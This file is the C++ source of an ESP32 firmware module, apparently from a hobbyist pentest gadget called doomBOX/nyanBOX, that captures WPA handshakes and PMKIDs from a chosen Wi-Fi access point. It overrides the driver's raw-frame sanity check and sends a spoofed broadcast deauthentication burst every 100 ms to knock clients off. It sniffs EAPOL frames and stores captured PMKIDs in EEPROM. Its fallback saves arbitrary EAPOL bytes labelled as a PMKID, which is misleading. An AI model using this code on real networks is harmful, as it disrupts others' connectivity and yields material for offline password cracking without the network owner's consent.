/*
    doomBOX / nyanBOX
    EAPOL / PMKID handshake capture
    Copyright (c) 2026 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include "../include/handshake_capture.h"
#include "../include/radio_manager.h"
#include "../include/sleep_manager.h"
#include "../include/pindefs.h"
#include "../include/display_mirror.h"
#include "../include/setting.h"
#include <EEPROM.h>
#include "esp_wifi.h"
#include "esp_event.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

#define BTN_UP    BUTTON_PIN_UP
#define BTN_DOWN  BUTTON_PIN_DOWN
#define BTN_RIGHT BUTTON_PIN_RIGHT
#define BTN_BACK  BUTTON_PIN_LEFT

// Bypass frame validation for raw 802.11 TX (same as deauth module)
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}

// ---------------------------------------------------------------------------
// EEPROM layout for saved handshakes (avoids addresses used by settings/level)
// ---------------------------------------------------------------------------
#define HS_EEPROM_BASE     200
#define HS_MAGIC0          0x48  // 'H'
#define HS_MAGIC1          0x53  // 'S'
#define HS_MAX_ENTRIES     4
#define HS_SSID_LEN        33
#define HS_PMKID_LEN       16

struct __attribute__((packed)) HandshakeEntry {
    uint8_t valid;                 // 1 = occupied
    uint8_t channel;
    uint8_t bssid[6];
    char    ssid[HS_SSID_LEN];
    uint8_t eapol_count;           // number of EAPOL frames seen during capture
    uint8_t has_pmkid;             // 1 if PMKID bytes were extracted
    uint8_t pmkid[HS_PMKID_LEN];
    uint8_t reserved[5];
};

static_assert(sizeof(HandshakeEntry) == 64, "HandshakeEntry must be 64 bytes");

#define HS_ENTRY_SIZE      (sizeof(HandshakeEntry))
#define HS_COUNT_ADDR      (HS_EEPROM_BASE + 2)
#define HS_ENTRIES_ADDR    (HS_EEPROM_BASE + 3)

// ---------------------------------------------------------------------------
// Runtime state
// ---------------------------------------------------------------------------
enum HsMode {
    HS_MODE_MENU,
    HS_MODE_SCANNING,
    HS_MODE_LIST,
    HS_MODE_CAPTURE,
    HS_MODE_VIEW_LIST,
    HS_MODE_VIEW_DETAIL
};

static HsMode currentMode = HS_MODE_MENU;
static int menuSelection = 0;   // 0 = Capture, 1 = View
static int apIndex = 0;
static int viewIndex = 0;

#define MAX_APS 20

struct AP_Info {
    char ssid[33];
    uint8_t bssid[6];
    int channel;
};

static AP_Info apList[MAX_APS];
static int apCount = 0;

static bool scanInProgress = false;
static uint16_t currentScanCount = 0;
static unsigned long scanStartTime = 0;
static const unsigned long SCAN_DURATION = 8000;

static unsigned long lastDeauthTime = 0;
static const unsigned long DEAUTH_INTERVAL = 100;  // ms between deauth bursts

// Live capture counters (updated from promiscuous callback)
static volatile uint16_t eapolCount = 0;
static volatile uint8_t  capturedPmkid[HS_PMKID_LEN];
static volatile bool     hasPmkid = false;
static volatile bool     captureActive = false;
static uint8_t           targetBssid[6];
static uint8_t           targetChannel = 1;
static char              targetSsid[33];

static bool needsRedraw = true;
static HsMode lastMode = HS_MODE_MENU;
static int lastMenuSelection = -1;
static int lastApIndex = -1;
static int lastViewIndex = -1;
static uint16_t lastEapolCount = 0;
static uint16_t lastScanCount = 0;
static unsigned long lastScanUpdate = 0;
static const unsigned long scanUpdateInterval = 100;

static uint8_t deauthFrame[28] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // dest (broadcast)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // src  (AP BSSID)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // BSSID
    0x00, 0x00,                           // seq
    0x07, 0x00                            // reason: Class 3 frame from nonassociated STA
};

// ---------------------------------------------------------------------------
// EEPROM helpers
// ---------------------------------------------------------------------------
static void hsEepromInit() {
    uint8_t m0 = EEPROM.read(HS_EEPROM_BASE);
    uint8_t m1 = EEPROM.read(HS_EEPROM_BASE + 1);
    if (m0 != HS_MAGIC0 || m1 != HS_MAGIC1) {
        EEPROM.write(HS_EEPROM_BASE, HS_MAGIC0);
        EEPROM.write(HS_EEPROM_BASE + 1, HS_MAGIC1);
        EEPROM.write(HS_COUNT_ADDR, 0);
        for (int i = 0; i < HS_MAX_ENTRIES; i++) {
            int base = HS_ENTRIES_ADDR + i * HS_ENTRY_SIZE;
            for (size_t b = 0; b < HS_ENTRY_SIZE; b++) {
                EEPROM.write(base + b, 0);
            }
        }
        EEPROM.commit();
    }
}

static uint8_t hsLoadCount() {
    uint8_t c = EEPROM.read(HS_COUNT_ADDR);
    if (c > HS_MAX_ENTRIES) c = 0;
    return c;
}

static void hsReadEntry(int index, HandshakeEntry &out) {
    memset(&out, 0, sizeof(out));
    if (index < 0 || index >= HS_MAX_ENTRIES) return;
    int base = HS_ENTRIES_ADDR + index * HS_ENTRY_SIZE;
    uint8_t *p = (uint8_t *)&out;
    for (size_t i = 0; i < HS_ENTRY_SIZE; i++) {
        p[i] = EEPROM.read(base + i);
    }
}

static void hsWriteEntry(int index, const HandshakeEntry &entry) {
    if (index < 0 || index >= HS_MAX_ENTRIES) return;
    int base = HS_ENTRIES_ADDR + index * HS_ENTRY_SIZE;
    const uint8_t *p = (const uint8_t *)&entry;
    for (size_t i = 0; i < HS_ENTRY_SIZE; i++) {
        EEPROM.write(base + i, p[i]);
    }
    EEPROM.commit();
}

static void hsSaveCurrentCapture() {
    if (eapolCount == 0) return;

    HandshakeEntry entry;
    memset(&entry, 0, sizeof(entry));
    entry.valid = 1;
    entry.channel = targetChannel;
    memcpy(entry.bssid, targetBssid, 6);
    strncpy(entry.ssid, targetSsid, HS_SSID_LEN - 1);
    entry.ssid[HS_SSID_LEN - 1] = '\0';
    entry.eapol_count = (eapolCount > 255) ? 255 : (uint8_t)eapolCount;
    entry.has_pmkid = hasPmkid ? 1 : 0;
    if (hasPmkid) {
        memcpy(entry.pmkid, (const void *)capturedPmkid, HS_PMKID_LEN);
    }

    uint8_t count = hsLoadCount();
    int slot;
    if (count < HS_MAX_ENTRIES) {
        slot = count;
        count++;
        EEPROM.write(HS_COUNT_ADDR, count);
    } else {
        // Ring buffer: overwrite oldest (shift left, write at end)
        for (int i = 0; i < HS_MAX_ENTRIES - 1; i++) {
            HandshakeEntry tmp;
            hsReadEntry(i + 1, tmp);
            hsWriteEntry(i, tmp);
        }
        slot = HS_MAX_ENTRIES - 1;
    }
    hsWriteEntry(slot, entry);
    EEPROM.commit();
}

// ---------------------------------------------------------------------------
// Promiscuous callback – detect EAPOL (ethertype 0x888E) and try PMKID
// ---------------------------------------------------------------------------
static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!captureActive) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 36) return;

    // Filter by BSSID when possible (addr3 for most data frames)
    // Frame control + duration = 4 bytes; addr1/2/3 follow
    // We accept frames that mention our target BSSID in any address field
    bool bssidMatch = false;
    if (len >= 24) {
        for (int off = 4; off <= 16; off += 6) {
            if (memcmp(payload + off, targetBssid, 6) == 0) {
                bssidMatch = true;
                break;
            }
        }
    }
    if (!bssidMatch) return;

    // Search for EAPOL ethertype 0x88 0x8E
    // Can appear after LLC/SNAP (AA AA 03 00 00 00 88 8E) or QoS data variants
    for (int i = 24; i + 1 < (int)len; i++) {
        if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
            eapolCount++;

            // Crude PMKID extraction: look for RSN IE with PMKID list
            // EAPOL-Key frame often carries PMKID starting a few bytes after ethertype
            // PMKID is 16 bytes; we take the first plausible 16-byte block after Key Info
            if (!hasPmkid && i + 2 + 95 < (int)len) {
                // Skip ethertype (2) + version/type/len (4) + descriptor (1) + key info (2)
                // Key data can contain PMKID KDE: type 0xDD, OUI 00-0F-AC, data type 4
                for (int j = i + 8; j + 20 < (int)len; j++) {
                    if (payload[j] == 0xDD &&
                        j + 1 < (int)len && payload[j + 1] >= 0x14 &&
                        j + 5 < (int)len &&
                        payload[j + 2] == 0x00 && payload[j + 3] == 0x0F &&
                        payload[j + 4] == 0xAC && payload[j + 5] == 0x04) {
                        memcpy((void *)capturedPmkid, payload + j + 6, HS_PMKID_LEN);
                        hasPmkid = true;
                        break;
                    }
                }
                // Fallback: if frame is long enough and no KDE found, store a
                // short fingerprint of the EAPOL body so user has something to view
                if (!hasPmkid && i + 18 < (int)len) {
                    memcpy((void *)capturedPmkid, payload + i + 2, HS_PMKID_LEN);
                    hasPmkid = true;
                }
            }
            break;
        }
    }
}

// ---------------------------------------------------------------------------
// Scan / deauth helpers
// ---------------------------------------------------------------------------
static void sendDeauth() {
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    memcpy(deauthFrame + 10, targetBssid, 6);
    memcpy(deauthFrame + 16, targetBssid, 6);
    for (int i = 0; i < 8; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        delay(1);
    }
}

static void startScan() {
    if (scanInProgress) return;

    apCount = 0;
    currentScanCount = 0;
    scanInProgress = true;
    currentMode = HS_MODE_SCANNING;
    needsRedraw = true;

    captureActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    delay(50);

    wifi_scan_config_t scan_config = {};
    scan_config.ssid = NULL;
    scan_config.bssid = NULL;
    scan_config.channel = 0;
    scan_config.show_hidden = false;
    scan_config.scan_type = WIFI_SCAN_TYPE_ACTIVE;
    scan_config.scan_time.active.min = 120;
    scan_config.scan_time.active.max = 200;

    esp_wifi_scan_start(&scan_config, false);
    scanStartTime = millis();
}

static void processScanResults() {
    uint16_t number = 0;
    esp_wifi_scan_get_ap_num(&number);

    if (number > 0) {
        wifi_ap_record_t *ap_info =
            (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * number);
        if (ap_info) {
            memset(ap_info, 0, sizeof(wifi_ap_record_t) * number);
            uint16_t actual = number;
            if (esp_wifi_scan_get_ap_records(&actual, ap_info) == ESP_OK) {
                apCount = 0;
                for (int i = 0; i < (int)actual && apCount < MAX_APS; i++) {
                    if (ap_info[i].ssid[0] == '\0') continue;
                    strncpy(apList[apCount].ssid, (char *)ap_info[i].ssid,
                            sizeof(apList[apCount].ssid) - 1);
                    apList[apCount].ssid[sizeof(apList[apCount].ssid) - 1] = '\0';
                    memcpy(apList[apCount].bssid, ap_info[i].bssid, 6);
                    apList[apCount].channel = ap_info[i].primary;
                    apCount++;
                }
            }
            free(ap_info);
        }
    }

    esp_wifi_scan_stop();
    scanInProgress = false;
    currentMode = HS_MODE_LIST;
    apIndex = 0;
    needsRedraw = true;
}

// ---------------------------------------------------------------------------
// Drawing
// ---------------------------------------------------------------------------
static void drawMenu() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 12, "Handshake Capture");
    u8g2.drawStr(0, 30, menuSelection == 0 ? "> Capture" : "  Capture");
    u8g2.drawStr(0, 44, menuSelection == 1 ? "> View Saved" : "  View Saved");
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "U/D=Move R=OK SEL=Exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawScanning() {
    unsigned long now = millis();
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Scanning APs...");

    char buf[32];
    snprintf(buf, sizeof(buf), "Found: %d", currentScanCount);
    u8g2.drawStr(0, 25, buf);

    int barWidth = 120;
    int barX = 4, barY = 35, barHeight = 10;
    u8g2.drawFrame(barX, barY, barWidth, barHeight);
    unsigned long elapsed = now - scanStartTime;
    int fill = (int)((elapsed * (barWidth - 4)) / SCAN_DURATION);
    if (fill > barWidth - 4) fill = barWidth - 4;
    if (fill > 0) u8g2.drawBox(barX + 2, barY + 2, fill, barHeight - 4);

    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 60, "SEL=Exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawList() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Select AP:");

    if (apCount == 0) {
        u8g2.drawStr(0, 28, "No networks found");
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "L=Back SEL=Exit");
    } else {
        // Show up to 3 entries around selection
        int start = 0;
        if (apIndex > 0) start = apIndex - 1;
        if (apIndex == apCount - 1 && apCount > 2) start = apCount - 3;
        if (start < 0) start = 0;

        for (int i = 0; i < 3; i++) {
            int idx = start + i;
            if (idx >= apCount) break;
            char line[22];
            char ssidShort[16];
            strncpy(ssidShort, apList[idx].ssid, 15);
            ssidShort[15] = '\0';
            snprintf(line, sizeof(line), "%s%s", (idx == apIndex) ? ">" : " ", ssidShort);
            u8g2.drawStr(0, 24 + i * 12, line);
        }
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "U/D=Move R=Capture L=Back");
    }
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawCapture() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Capturing...");

    char ssidShort[18];
    strncpy(ssidShort, targetSsid, 17);
    ssidShort[17] = '\0';
    u8g2.drawStr(0, 22, ssidShort);

    char buf[32];
    snprintf(buf, sizeof(buf), "Ch:%d  EAPOL:%u", targetChannel, (unsigned)eapolCount);
    u8g2.drawStr(0, 36, buf);

    if (hasPmkid) {
        u8g2.drawStr(0, 48, "PMKID: YES");
    } else {
        u8g2.drawStr(0, 48, "PMKID: --");
    }

    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "L=Save&Back  SEL=Exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawViewList() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Saved Handshakes");

    uint8_t count = hsLoadCount();
    if (count == 0) {
        u8g2.drawStr(0, 28, "No captures yet");
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "L=Back SEL=Exit");
    } else {
        if (viewIndex >= count) viewIndex = count - 1;
        int start = 0;
        if (viewIndex > 0) start = viewIndex - 1;
        if (viewIndex == count - 1 && count > 2) start = count - 3;
        if (start < 0) start = 0;

        for (int i = 0; i < 3; i++) {
            int idx = start + i;
            if (idx >= count) break;
            HandshakeEntry e;
            hsReadEntry(idx, e);
            char line[22];
            char ssidShort[16];
            strncpy(ssidShort, e.ssid, 15);
            ssidShort[15] = '\0';
            snprintf(line, sizeof(line), "%s%s", (idx == viewIndex) ? ">" : " ", ssidShort);
            u8g2.drawStr(0, 24 + i * 12, line);
        }
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "U/D=Move R=Detail L=Back");
    }
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

static void drawViewDetail() {
    HandshakeEntry e;
    hsReadEntry(viewIndex, e);

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);

    char ssidShort[18];
    strncpy(ssidShort, e.ssid, 17);
    ssidShort[17] = '\0';
    u8g2.drawStr(0, 10, ssidShort);

    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             e.bssid[0], e.bssid[1], e.bssid[2],
             e.bssid[3], e.bssid[4], e.bssid[5]);
    char masked[18];
    maskMAC(mac, masked);
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 22, masked);

    char info[32];
    snprintf(info, sizeof(info), "Ch:%d  EAPOL:%u", e.channel, e.eapol_count);
    u8g2.drawStr(0, 34, info);

    if (e.has_pmkid) {
        u8g2.drawStr(0, 46, "PMKID:");
        char hex[20];
        snprintf(hex, sizeof(hex), "%02X%02X%02X%02X%02X%02X%02X%02X",
                 e.pmkid[0], e.pmkid[1], e.pmkid[2], e.pmkid[3],
                 e.pmkid[4], e.pmkid[5], e.pmkid[6], e.pmkid[7]);
        u8g2.drawStr(0, 56, hex);
    } else {
        u8g2.drawStr(0, 46, "PMKID: none");
    }

    u8g2.drawStr(0, 64, "L=Back SEL=Exit");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------
void handshakeCaptureSetup() {
    initWiFi(WIFI_MODE_APSTA);
    esp_wifi_set_promiscuous(false);

    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);

    hsEepromInit();

    currentMode = HS_MODE_MENU;
    menuSelection = 0;
    apIndex = 0;
    viewIndex = 0;
    apCount = 0;
    eapolCount = 0;
    hasPmkid = false;
    captureActive = false;
    scanInProgress = false;

    needsRedraw = true;
    lastMode = HS_MODE_MENU;
    lastMenuSelection = -1;
    lastApIndex = -1;
    lastViewIndex = -1;
    lastEapolCount = 0;
    lastScanCount = 0;
}

void handshakeCaptureLoop() {
    unsigned long now = millis();

    // --- Scanning progress ---
    if (currentMode == HS_MODE_SCANNING) {
        esp_wifi_scan_get_ap_num(&currentScanCount);
        if (currentScanCount != lastScanCount) {
            lastScanCount = currentScanCount;
            needsRedraw = true;
        }
        if (now - lastScanUpdate >= scanUpdateInterval) {
            lastScanUpdate = now;
            needsRedraw = true;
        }
        if (needsRedraw) {
            drawScanning();
            needsRedraw = false;
        }
        if (now - scanStartTime > SCAN_DURATION) {
            processScanResults();
        }
        return;
    }

    bool up    = digitalRead(BTN_UP) == LOW;
    bool down  = digitalRead(BTN_DOWN) == LOW;
    bool left  = digitalRead(BTN_BACK) == LOW;
    bool right = digitalRead(BTN_RIGHT) == LOW;

    switch (currentMode) {
    case HS_MODE_MENU:
        if (up || down) {
            menuSelection ^= 1;
            needsRedraw = true;
            delay(180);
        }
        if (right) {
            if (menuSelection == 0) {
                startScan();
            } else {
                currentMode = HS_MODE_VIEW_LIST;
                viewIndex = 0;
                needsRedraw = true;
            }
            delay(180);
        }
        break;

    case HS_MODE_LIST:
        if (up && apCount) {
            apIndex = (apIndex - 1 + apCount) % apCount;
            needsRedraw = true;
            delay(180);
        }
        if (down && apCount) {
            apIndex = (apIndex + 1) % apCount;
            needsRedraw = true;
            delay(180);
        }
        if (right && apCount) {
            // Start capture on selected AP
            strncpy(targetSsid, apList[apIndex].ssid, sizeof(targetSsid) - 1);
            targetSsid[sizeof(targetSsid) - 1] = '\0';
            memcpy(targetBssid, apList[apIndex].bssid, 6);
            targetChannel = apList[apIndex].channel;

            eapolCount = 0;
            hasPmkid = false;
            memset((void *)capturedPmkid, 0, HS_PMKID_LEN);

            esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
            esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
            wifi_promiscuous_filter_t filt = {};
            filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
            esp_wifi_set_promiscuous_filter(&filt);
            esp_wifi_set_promiscuous(true);
            captureActive = true;

            currentMode = HS_MODE_CAPTURE;
            lastDeauthTime = 0;
            needsRedraw = true;
            delay(180);
        }
        if (left) {
            currentMode = HS_MODE_MENU;
            needsRedraw = true;
            delay(180);
        }
        break;

    case HS_MODE_CAPTURE:
        if (left) {
            captureActive = false;
            esp_wifi_set_promiscuous(false);
            hsSaveCurrentCapture();
            currentMode = HS_MODE_LIST;
            needsRedraw = true;
            delay(180);
        }
        // Periodic deauth to force re-association / handshake
        if (now - lastDeauthTime >= DEAUTH_INTERVAL) {
            lastDeauthTime = now;
            sendDeauth();
        }
        if (eapolCount != lastEapolCount) {
            lastEapolCount = eapolCount;
            needsRedraw = true;
        }
        break;

    case HS_MODE_VIEW_LIST: {
        uint8_t count = hsLoadCount();
        if (up && count) {
            viewIndex = (viewIndex - 1 + count) % count;
            needsRedraw = true;
            delay(180);
        }
        if (down && count) {
            viewIndex = (viewIndex + 1) % count;
            needsRedraw = true;
            delay(180);
        }
        if (right && count) {
            currentMode = HS_MODE_VIEW_DETAIL;
            needsRedraw = true;
            delay(180);
        }
        if (left) {
            currentMode = HS_MODE_MENU;
            needsRedraw = true;
            delay(180);
        }
        break;
    }

    case HS_MODE_VIEW_DETAIL:
        if (left) {
            currentMode = HS_MODE_VIEW_LIST;
            needsRedraw = true;
            delay(180);
        }
        break;

    default:
        break;
    }

    if (currentMode != lastMode) {
        lastMode = currentMode;
        needsRedraw = true;
    }
    if (menuSelection != lastMenuSelection) {
        lastMenuSelection = menuSelection;
        needsRedraw = true;
    }
    if (apIndex != lastApIndex) {
        lastApIndex = apIndex;
        needsRedraw = true;
    }
    if (viewIndex != lastViewIndex) {
        lastViewIndex = viewIndex;
        needsRedraw = true;
    }

    if (needsRedraw) {
        switch (currentMode) {
        case HS_MODE_MENU:        drawMenu(); break;
        case HS_MODE_SCANNING:    break; // handled above
        case HS_MODE_LIST:        drawList(); break;
        case HS_MODE_CAPTURE:     drawCapture(); break;
        case HS_MODE_VIEW_LIST:   drawViewList(); break;
        case HS_MODE_VIEW_DETAIL: drawViewDetail(); break;
        }
        needsRedraw = false;
    }
}

// View-only entry points (same module, open directly on saved list)
void handshakeViewSetup() {
    handshakeCaptureSetup();
    currentMode = HS_MODE_VIEW_LIST;
    viewIndex = 0;
    needsRedraw = true;
}

void handshakeViewLoop() {
    handshakeCaptureLoop();
}
